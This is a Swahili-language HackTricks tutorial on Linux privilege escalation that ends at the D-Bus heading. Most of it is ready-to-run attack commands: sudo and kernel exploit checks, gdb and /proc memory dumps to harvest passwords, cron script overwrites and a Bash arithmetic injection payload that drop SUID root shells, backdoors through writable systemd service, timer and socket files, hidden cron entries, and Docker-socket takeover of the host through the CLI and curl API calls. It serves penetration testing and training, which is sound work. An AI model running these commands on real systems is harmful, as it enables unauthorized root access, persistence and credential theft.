# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata maarifa kuhusu OS inayokimbia
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa **una ruhusa za kuandika kwenye folda yoyote ndani ya variable ya `PATH`** unaweza ku-hijack baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Taarifa za Env

Je, kuna taarifa za kuvutia, nywila au API keys katika environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Angalia toleo la kernel na uone kama kuna exploit yoyote inayoweza kutumika ku-escalate privileges.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zilizo hatarini na baadhi ya **compiled exploits** hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa toleo zote za kernel zilizo hatarini kutoka kwenye tovuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Zana ambazo zinaweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (endesha KATIKA victim, inachunguza tu exploits za kernel 2.x)

Daima **tafuta toleo la kernel kwenye Google**, labda toleo lako la kernel limeandikwa katika exploit fulani na utakuwa hakika kwamba exploit hiyo ni halali.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Toleo la sudo

Kulingana na matoleo ya sudo yaliyo dhaifu yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia ikiwa toleo la sudo linaweza kuathirika kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.8.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: ukaguzi wa saini ulishindwa

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln inaweza kutumika
```bash
dmesg 2>/dev/null | grep "signature"
```
### Zaidi ya uorodheshaji wa mfumo
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha kinga zinazowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ikiwa uko ndani ya docker container, unaweza kujaribu kutoroka kutoka ndani yake:

{{#ref}}
docker-security/
{{#endref}}

## Diski

Angalia **what is mounted and unmounted**, wapi na kwa nini. Ikiwa kitu chochote kime unmounted unaweza kujaribu kukimount na kukagua kwa taarifa binafsi
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia ikiwa **compiler yoyote imewekwa**. Hii ni muhimu ikiwa unahitaji kutumia kernel exploit fulani, kwani inapendekezwa ku-compile kwenye mashine utakayoitumia (au kwenye ile inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Udhaifu Zimewekwa

Angalia **toleo la vifurushi na huduma zilizosanikishwa**. Pengine kuna toleo la zamani la Nagios (kwa mfano) that could be exploited for escalating privileges…\  
Inashauriwa kukagua kwa mkono toleo la programu zilizosanikishwa zinazoshukiwa zaidi.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikiaji wa SSH kwenye mashine unaweza pia kutumia **openVAS** kuchunguza programu zilizopitwa na wakati na zilizo hatarini zilizowekwa ndani ya mashine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo kwa ujumla hazitakuwa za manufaa, kwa hivyo inapendekezwa programu kama OpenVAS au nyingine zinazofanana ambazo zitakagua ikiwa toleo lolote la programu lililosakinishwa linaweza kuathiriwa na exploits zinazojulikana_

## Michakato

Tazama **ni michakato gani** inayoendeshwa na ukague ikiwa kuna mchakato wowote unao **idhinishwa zaidi kuliko inavyostahili** (labda tomcat inaendeshwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** hutambua hayo kwa kuangalia parameter `--inspect` ndani ya mstari wa amri wa mchakato.\
Pia **check your privileges over the processes binaries**, labda unaweza kuwaeza kuandika juu ya baadhi yao.

### Process monitoring

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kuwa ya msaada mkubwa kubaini michakato dhaifu inayotekelezwa mara kwa mara au wakati seti ya mahitaji yanatimizwa.

### Process memory

Baadhi ya services za server huhifadhi **credentials in clear text inside the memory**.\
Kawaida utahitaji **root privileges** kusoma kumbukumbu za michakato inayomilikiwa na watumiaji wengine, kwa hivyo hii kwa kawaida ni ya msaada zaidi unapokuwa tayari root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Kumbuka kwamba sasa hivi mashine nyingi **haziruhusu ptrace kwa default** ambayo inamaanisha kwamba huwezi dump michakato mingine inayomilikiwa na mtumiaji wako asiye na idhini.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ inasimamia upatikanaji wa ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. Hii ndilo namna ya jadi jinsi ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Ikiwa una ufikiaji wa kumbukumbu za huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani yake credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skripti ya GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa ID ya mchakato fulani, **maps zinaonyesha jinsi kumbukumbu inavyopangwa ndani ya nafasi ya anwani pepe ya mchakato**; pia inaonyesha **uruhusa za kila eneo lililopangwa**. Faili bandia **mem** **inafunua moja kwa moja kumbukumbu za mchakato**. Kutoka kwenye faili ya **maps** tunajua ni **eneo gani za kumbukumbu zinazosomika** na offsets zao. Tunatumia taarifa hizi **kutafuta ndani ya faili ya mem na dump maeneo yote yanayosomika** katika faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikiaji wa kumbukumbu ya mfumo ya **kimwili**, si kumbukumbu ya virtual. Nafasi ya anwani ya virtual ya kernel inaweza kufikiwa kwa kutumia /dev/kmem.\
Kawaida, `/dev/mem` inaweza kusomwa tu na kundi la **root** na **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump ni utekelezaji wa ProcDump kwa Linux uliotengenezwa upya wa zana ya ProcDump ya jadi kutoka kwenye mkusanyiko wa zana za Sysinternals kwa Windows. Pata kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Zana

To dump a process memory you could use:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa kwa mkono mahitaji ya root na dump mchakato unaomilikiwa na wewe
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Nyaraka za Uthibitisho kutoka kwa kumbukumbu ya mchakato

#### Mfano wa mkono

If you find that the authenticator process is running:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza dump the process (tazama sehemu zilizopita ili kupata njia tofauti za dump the memory of a process) na kutafuta credentials ndani ya memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Chombo [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) kitafanya **steal clear text credentials from memory** na kutoka kwa baadhi ya **well known files**. Kinahitaji root privileges ili kifanye kazi ipasavyo.

| Sifa                                              | Jina la Mchakato     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Regex za Utafutaji/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Kazi Zilizopangwa / Cron jobs

### Crontab UI (alseambusher) inayotumika kama root – web-based scheduler privesc

Ikiwa paneli ya mtandao “Crontab UI” (alseambusher/crontab-ui) inaendesha kama root na imefungwa kwa loopback pekee, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda kazi yenye mamlaka ili privesc.

Mnyororo wa kawaida
- Tambua port inayofungwa kwa loopback pekee (e.g., 127.0.0.1:8000) na Basic-Auth realm kwa kutumia `ss -ntlp` / `curl -v localhost:8000`
- Pata credentials katika artefakti za uendeshaji:
- Backups/skripti zenye `zip -P <password>`
- unit ya systemd inayofunua `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tuneli na ingia:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Unda high-priv job na iendeshe mara moja (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Tumia:
```bash
/tmp/rootshell -p   # root shell
```
Kuimarisha
- Usiruhusu Crontab UI kuendesha kama root; kaza kwa mtumiaji maalum na ruhusa ndogo kabisa
- Funga kwenye localhost na pia zuia upatikanaji kupitia firewall/VPN; usirudie passwords
- Epuka kuweka secrets ndani ya unit files; tumia secret stores au root-only EnvironmentFile
- Washa audit/logging kwa on-demand job executions

Angalia kama scheduled job yoyote iko vulnerable. Labda unaweza kuchukua faida ya script inayotekelezwa na root (wildcard vuln? unaweza kubadilisha files ambazo root anazitumia? tumia symlinks? unda files maalum kwenye directory ambayo root anatumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka jinsi mtumiaji "user" ana ruhusa za kuandika juu ya /home/user_)

Iwapo ndani ya crontab hii mtumiaji root anajaribu kutekeleza amri au script bila kuweka path. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Kisha, unaweza kupata shell ya root kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron ikitumia script na wildcard (Wildcard Injection)

Kama script inapoendeshwa na root na ina “**\***” ndani ya amri, unaweza kuitumia kufanya mambo yasiyotegemewa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard imewekwa kabla ya njia kama** _**/some/path/\***_ **, haiko hatarini (hata** _**./\***_ **sio).**

Soma ukurasa ufuatao kwa mbinu za ziada za wildcard exploitation:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash hufanya parameter expansion na command substitution kabla ya arithmetic evaluation katika ((...)), $((...)) na let. Ikiwa root cron/parser inasoma fields za logi zisizotegemewa na kuziingiza katika muktadha wa arithmetic, mshambuliaji anaweza kuingiza command substitution $(...) ambayo inatekelezwa kama root wakati cron inapoendesha.

- Kwa nini inafanya kazi: In Bash, expansions hufanyika kwa mpangilio huu: parameter/variable expansion, command substitution, arithmetic expansion, kisha word splitting na pathname expansion. Hivyo thamani kama `$(/bin/bash -c 'id > /tmp/pwn')0` kwanza inabadilishwa (ikiumba command), kisha nambari iliyobaki `0` inatumiwa kwa arithmetic ili script iendelee bila makosa.

- Mfano wa kawaida unaoathirika:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Pata maandishi yanayotumika na mshambuliaji yaandikwe kwenye logi inayochambuliwa ili uwanja unaonekana kama nambari uwe na command substitution na uishe kwa tarakimu. Hakikisha amri yako haichapishi kwa stdout (au izielekeze) ili arithmetic ibaki halali.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ikiwa unaweza **can modify a cron script** executed by root, unaweza kupata shell kwa urahisi sana:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script inayotekelezwa na root inatumia **directory ambapo una upatikanaji kamili**, inaweza kuwa muhimu kufuta folder hiyo na **kuunda symlink folder kuelekea nyingine** inayohudumia script unaodhibiti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Cron jobs za mara kwa mara

Unaweza kufuatilia processes ili kutafuta zile zinazotekelezwa kila dakika 1, 2 au 5. Huenda ukaweza kutumia fursa hiyo na escalate privileges.

Kwa mfano, ili **kutazama kila 0.1s kwa muda wa dakika 1**, **kupanga kwa amri zilizotekelezwa kidogo** na kufuta amri zilizotekelezwa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila process itakayozinduka).

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob **kwa kuweka carriage return baada ya comment** (bila newline character), na cron job itafanya kazi. Mfano (angalia carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Huduma

### Faili za _.service_ Zinazoweza Kuandikwa

Angalia kama unaweza kuandika faili yoyote ya `.service`. Ikiwa unaweza, unaweza **kuibadilisha** ili iweze **kutekeleza** backdoor yako wakati huduma inapo **anzishwa**, **ianzishwa upya** au **simamishwa** (labda utahitaji kusubiri hadi mashine ianze upya).\
Kwa mfano, tengeneza backdoor yako ndani ya faili ya .service kwa **`ExecStart=/tmp/script.sh`**

### Binaries za huduma zinazoweza kuandikwa

Kumbuka kwamba ikiwa una **idhini ya kuandika juu ya binaries zinazotekelezwa na huduma**, unaweza kuzibadilisha kuwa backdoor, hivyo wakati huduma zitakaporudi kutekelezwa backdoor nayo itatekelezwa.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumika na **systemd** kwa:
```bash
systemctl show-environment
```
Ikiwa ugundua kwamba unaweza **kuandika** katika folda yoyote ya njia hiyo, huenda ukaweza **kupandisha ruhusa**. Unahitaji kutafuta **njia zinazorejea zinazotumika kwenye faili za usanidi wa huduma** kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza **kifaili kinachoendeshwa** chenye **same name as the relative path binary** ndani ya systemd PATH folder unayoweza kuandika, na wakati service itakapoulizwa kutekeleza kitendo hatarishi (**Anza**, **Simamisha**, **Pakia upya**), **backdoor yako itaendeshwa** (watumiaji wasiokuwa na ruhusa kwa kawaida hawawezi kuanza/kuacha services lakini angalia ikiwa unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa `man systemd.service`.**

## **Timers**

**Timers** ni systemd unit files whose name ends in `**.timer**` that control `**.service**` files or events. **Timers** zinaweza kutumika kama mbadala wa cron kwani zina msaada uliojengwa kwa ajili ya matukio ya kalenda na matukio ya wakati monotonic na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kubadilisha timer, unaweza kuifanya itekeleze baadhi ya vitu vilivyopo vya systemd.unit (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
Katika nyaraka unaweza kusoma ni nini Unit inamaanisha:

> Kitengo cha kuanzishwa wakati timer hii itakapomalizika. Hoja ni jina la unit, kiambishi mwisho chake si ".timer". Ikiwa haitajwi, thamani hii kwa kawaida itakuwa service ambayo ina jina sawa na unit ya timer, isipokuwa kwa kiambishi mwisho. (Angalia hapo juu.) Inapendekezwa kwamba jina la unit linaloanzishwa na jina la unit ya timer liwe sawa kabisa, isipokuwa kwa kiambishi mwisho.

Kwa hivyo, ili kutumia vibaya ruhusa hii unahitaji:

- Tafuta unit ya systemd (kama `.service`) ambayo inatekeleza **binary inayoweza kuandikwa**
- Tafuta unit ya systemd ambayo inatekeleza **relative path** na uko na **idhini za kuandika** juu ya **systemd PATH** (ili kujifanya executable hiyo)

**Jifunze zaidi kuhusu timers kwa kutumia `man systemd.timer`.**

### **Kuwezesha Timer**

Ili kuwezesha timer unahitaji ruhusa za root na kuendesha:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Kumbuka the **timer** ina **amilishwa** kwa kuunda symlink yake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) zinawezesha **mawasiliano ya mchakato** kwenye mashine ile ile au tofauti ndani ya miundo ya client-server. Zinatumia faili za kiashiria za Unix za mawasiliano kati ya kompyuta na zinaanzishwa kupitia `.socket` files.

Sockets zinaweza kusanidiwa kwa kutumia `.socket` files.

**Jifunze zaidi kuhusu sockets kwa `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguzi hizi ni tofauti, lakini muhtasari hutumika ili **kuonyesha mahali itakayosikiliza** socket (njia ya faili ya AF_UNIX ya socket, IPv4/6 na/au nambari ya bandari kusikiliza, n.k.)
- `Accept`: Inachukua hoja ya boolean. Ikiwa **true**, **service instance inazaliwa kwa kila muunganisho unaoingia** na socket ya muunganisho tu ndiyo hupitishwa kwake. Ikiwa **false**, sockets zote zinasikilizwa zinapitwa kwa **service unit iliyozinduliwa**, na service unit moja tu inazaliwa kwa muunganisho wote. Thamani hii haisiwahi kwa datagram sockets na FIFOs ambapo service unit moja bila sharti hushughulikia trafiki yote inayokuja. **Defaults to false**. Kwa sababu za utendaji, inapendekezwa kuandika daemons mpya kwa njia inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Zinachukua mstari wa amri mmoja au zaidi, ambayo **hutekelezwa kabla** au **baada** sockets/FIFOs za kusikiliza zinapoundwa na kuunganishwa, mtawalia. Kielelezo cha kwanza cha mstari wa amri lazima kiwe jina kamili la faili, kisha kufuatwa na hoja za mchakato.
- `ExecStopPre`, `ExecStopPost`: Amri za ziada ambazo **hutekelezwa kabla** au **baada** sockets/FIFOs za kusikiliza zinapofungwa na kuondolewa, mtawalia.
- `Service`: Inabainisha jina la **service** unit **kuamsha** juu ya **trafiki inayokuja**. Mipangilio hii inaruhusiwa tu kwa sockets zenye Accept=no. Inatumiwa kwa kutumia service yenye jina sawa na socket (na kiongezi kikibadilishwa). Katika mengi ya matukio, haitakuwa muhimu kutumia chaguo hili.

### Faili za .socket zinazoweza kuandikwa

Ikiwa utapata faili ya `.socket` inayoweza kuandikwa, unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket itakapoundwa. Kwa hiyo, **huenda utahitaji kusubiri hadi mashine ianzishwe upya.**\
_Kumbuka kwamba mfumo lazima uwe ukitumia usanidi huo wa faili ya socket au backdoor haitatekelezwa_

### Sockets zinazoweza kuandikwa

Ikiwa **utatambua socket yoyote inayoweza kuandikwa** (_sasa tunazungumzia Unix Sockets na si kuhusu faili za usanidi `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na labda kutumia udhaifu.

### Orodhesha Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho wa ghafi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kwamba kunaweza kuwa na baadhi ya **sockets listening for HTTP** requests (_Sio ninaozungumzia .socket files, bali files zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **responds with an HTTP** request, then you can **kuwasiliana** with it and maybe **exploit some vulnerability**.

### Socket ya Docker inayoweza kuandikwa

The Docker socket, often found at `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kulindwa. Kwa default, inaweza kuandikwa na mtumiaji `root` na wanachama wa kikundi cha `docker`. Kuwa na haki ya kuandika kwenye socket hii kunaweza kusababisha privilege escalation. Hapa kuna muhtasari wa jinsi hii inaweza kufanywa na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Privilege Escalation with Docker CLI**

Ikiwa una haki ya kuandika kwenye Docker socket, unaweza escalate privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Hizi amri zinakuwezesha kuendesha container yenye ufikiaji wa root kwenye mfumo wa faili wa host.

#### **Kutumia Docker API kwa moja kwa moja**

Katika matukio ambapo Docker CLI haipo, docker socket bado inaweza kudhibitiwa kwa kutumia Docker API na amri za `curl`.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kuanzisha muunganisho wa `socat`, unaweza kutekeleza amri moja kwa moja ndani ya container ukiwa na ufikiaji wa root kwenye mfumo wa faili wa host.

### Wengine

Kumbuka kwamba ikiwa una ruhusa za kuandika juu ya docker socket kwa sababu uko **inside the group `docker`** una [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ikiwa utagundua kuwa unaweza kutumia amri ya **`ctr`**, soma ukurasa ufuatao kwani **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ikiwa utagundua kuwa unaweza kutumia amri ya **`runc`**, soma ukurasa ufuatao kwani **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

